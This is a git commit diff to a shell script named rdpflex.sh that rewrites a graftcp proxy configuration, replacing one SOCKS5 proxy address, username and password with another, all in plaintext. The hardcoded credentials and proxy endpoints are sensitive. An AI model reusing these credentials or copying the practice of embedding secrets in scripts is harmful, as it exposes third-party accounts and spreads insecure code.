45cb03a010fb134cdb691e48a2c3c0c55131370f
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-04-24 11:30:29 +0700

    Update rdpflex.sh

--- rdpflex.sh
+++ rdpflex.sh
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.9.154.251:12324
-socks5_username = 14a5029e51675
-socks5_password = 9d332fa7c0
+socks5 = 45.86.71.9:6269
+socks5_username = tahugoreng
+socks5_password = dadakan123
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
